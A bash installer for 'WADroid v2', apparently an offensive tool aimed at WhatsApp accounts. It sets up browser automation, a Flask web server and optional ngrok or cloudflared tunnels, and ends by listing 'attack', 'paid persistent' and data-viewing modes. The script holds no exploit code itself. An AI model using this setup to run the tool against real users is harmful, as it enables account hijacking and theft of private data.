#!/bin/bash
# WADroid v2 Setup — Termux & Kali Linux

set -e

G='\033[0;32m'
Y='\033[1;33m'
C='\033[0;36m'
R='\033[0;31m'
N='\033[0m'

echo -e "${G}"
echo "  WADroid v2 — Installer"
echo -e "  ──────────────────────${N}"

# ── Detect platform
if [ -d "/data/data/com.termux" ]; then
    PLATFORM="termux"
    echo -e "${C}Platform: Termux${N}"
elif [ -f "/etc/kali-release" ] || [ -f "/etc/debian_version" ]; then
    PLATFORM="linux"
    echo -e "${C}Platform: Kali / Debian Linux${N}"
else
    PLATFORM="linux"
    echo -e "${Y}Platform: Generic Linux${N}"
fi

# ── Termux setup
if [ "$PLATFORM" = "termux" ]; then
    echo -e "${Y}Termux packages install ho rahe hain...${N}"
    pkg update -y
    pkg upgrade -y
    pkg install -y python chromium openssh git

    echo -e "${Y}Pip dependencies...${N}"
    pip install --upgrade pip
    pip install selenium flask flask-socketio colorama requests Pillow

    # chromedriver for Termux
    echo -e "${Y}Chromedriver setup...${N}"
    CHROME_VER=$(chromium-browser --version 2>/dev/null | grep -oP '\d+\.\d+\.\d+' | head -1)
    if [ -z "$CHROME_VER" ]; then
        echo -e "${R}Chromium version detect nahi hui — manual chromedriver install karo.${N}"
    else
        MAJOR=$(echo $CHROME_VER | cut -d. -f1)
        echo -e "${C}Chromium major version: ${MAJOR}${N}"
        echo -e "${Y}Note: Termux pe chromedriver alag se download karna pad sakta hai.${N}"
        echo -e "${Y}pip install chromedriver-autoinstaller try karo:${N}"
        pip install chromedriver-autoinstaller 2>/dev/null || true
    fi

fi

# ── Kali / Linux setup
if [ "$PLATFORM" = "linux" ]; then
    echo -e "${Y}System packages install ho rahe hain...${N}"
    sudo apt update -y
    sudo apt install -y python3 python3-pip chromium-browser openssh-client

    # Google Chrome agar available hai
    if ! command -v google-chrome-stable &>/dev/null; then
        echo -e "${Y}Google Chrome install ho raha hai...${N}"
        wget -q -O /tmp/chrome.deb https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb 2>/dev/null
        sudo dpkg -i /tmp/chrome.deb 2>/dev/null || sudo apt -f install -y
        rm -f /tmp/chrome.deb
    fi

    echo -e "${Y}Pip dependencies...${N}"
    pip3 install --upgrade pip
    pip3 install selenium flask flask-socketio colorama requests Pillow
    pip3 install chromedriver-autoinstaller 2>/dev/null || true
fi

# ── Create project dirs
echo -e "${Y}Project folders bana raha hai...${N}"
mkdir -p output sessions static templates core

# ── Optional: ngrok install
echo ""
echo -e "${C}Ngrok install karna hai? (paid mode ke liye) [y/N]${N}"
read -r NGROK_ANS
if [ "$NGROK_ANS" = "y" ] || [ "$NGROK_ANS" = "Y" ]; then
    if [ "$PLATFORM" = "termux" ]; then
        pkg install -y ngrok 2>/dev/null || {
            echo -e "${Y}Manual install: https://ngrok.com/download${N}"
        }
    else
        if ! command -v ngrok &>/dev/null; then
            curl -s https://ngrok-agent.s3.amazonaws.com/ngrok-v3-stable-linux-amd64.tgz | sudo tar xz -C /usr/local/bin
        fi
    fi
    echo -e "${G}Ngrok ready!${N}"
fi

# ── Optional: cloudflared
echo -e "${C}Cloudflared install karna hai? (backup tunnel) [y/N]${N}"
read -r CF_ANS
if [ "$CF_ANS" = "y" ] || [ "$CF_ANS" = "Y" ]; then
    if [ "$PLATFORM" = "termux" ]; then
        pkg install -y cloudflared 2>/dev/null || echo -e "${Y}Manual: https://github.com/cloudflare/cloudflared${N}"
    else
        if ! command -v cloudflared &>/dev/null; then
            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb -O /tmp/cf.deb
            sudo dpkg -i /tmp/cf.deb 2>/dev/null || sudo apt -f install -y
            rm -f /tmp/cf.deb
        fi
    fi
    echo -e "${G}Cloudflared ready!${N}"
fi

echo ""
echo -e "${G}════════════════════════════════════════${N}"
echo -e "${G}  Setup complete!${N}"
echo -e "${G}════════════════════════════════════════${N}"
echo ""
echo -e "${C}Commands:${N}"
echo -e "  ${Y}python3 wadroid.py -m local${N}          # Free local attack"
echo -e "  ${Y}python3 wadroid.py -m paid${N}           # Paid persistent mode"
echo -e "  ${Y}python3 wadroid.py -m paid --ngrok-token YOUR_TOKEN${N}"
echo -e "  ${Y}python3 wadroid.py --resume${N}           # Resume session"
echo -e "  ${Y}python3 wadroid.py --view${N}             # View data"
echo -e "  ${Y}python3 wadroid.py --clean${N}            # Wipe everything"
echo -e "  ${Y}python3 wadroid.py --visible${N}          # Show browser"
echo ""